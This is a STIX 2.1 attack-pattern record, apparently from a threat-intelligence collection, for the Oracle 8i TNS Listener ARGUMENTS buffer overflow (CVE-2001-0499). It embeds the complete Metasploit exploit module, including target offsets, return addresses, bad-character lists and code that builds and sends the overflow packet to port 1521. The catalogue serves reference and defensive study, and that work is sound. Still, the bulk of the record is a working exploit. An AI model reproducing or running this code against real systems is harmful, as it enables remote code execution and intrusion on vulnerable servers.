{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bdf7c907-5780-4339-b1d5-718d9adf4b8b",
    "created": "2024-08-14T16:50:18.610301Z",
    "modified": "2024-08-14T16:50:18.610306Z",
    "name": "Oracle 8i TNS Listener (ARGUMENTS) Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Oracle 8i. When sending a specially crafted packet containing an overly long ARGUMENTS string to the TNS service, an attacker may be able to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/oracle/tns_arguments.rb",
            "external_id": "tns_arguments.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2001-0499"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::TNS\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle 8i TNS Listener (ARGUMENTS) Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Oracle 8i. When\n        sending a specially crafted packet containing an overly long\n        ARGUMENTS string to the TNS service, an attacker may be able\n        to execute arbitrary code.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2001-0499' ],\n          [ 'OSVDB', '9427'],\n          [ 'BID', '2941' ],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 600,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c&=+?:;-,/#.\\\\\\$\\% ()\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Oracle 8.1.7.0.0 Standard Edition (Windows 2000)',   { 'Offset' => 6383, 'Ret' => 0x60a1e154 } ],\n          [ 'Oracle 8.1.7.0.0 Standard Edition (Windows 2003)',   { 'Offset' => 6379, 'Ret' => 0x60a1e154 }] ,\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2001-06-28'))\n\n    register_options([Opt::RPORT(1521)])\n  end\n\n  def check\n    connect\n    version = \"(CONNECT_DATA=(COMMAND=VERSION))\"\n    pkt = tns_packet(version)\n    sock.put(pkt)\n    sock.get_once\n    res = sock.get_once(-1, 1)\n    disconnect\n\n    if ( res and res =~ /32-bit Windows: Version 8\\.1\\.7\\.0\\.0/ )\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n      buff =  rand_text_alpha_upper(target['Offset'] - payload.encoded.length) + payload.encoded\n      buff << Rex::Arch::X86.jmp_short(6) + make_nops(2) + [target.ret].pack('V')\n      buff << [0xe8, -550].pack('CV') + rand_text_alpha_upper(966)\n\n      sploit = \"(CONNECT_DATA=(COMMAND=STATUS)(ARGUMENTS=#{buff}))\"\n\n      pkt = tns_packet(sploit)\n\n      print_status(\"Trying target #{target.name}...\")\n      sock.put(pkt)\n\n      handler\n\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2001-06-28",
    "x_mitre_platforms": [
        "win'"
    ]
}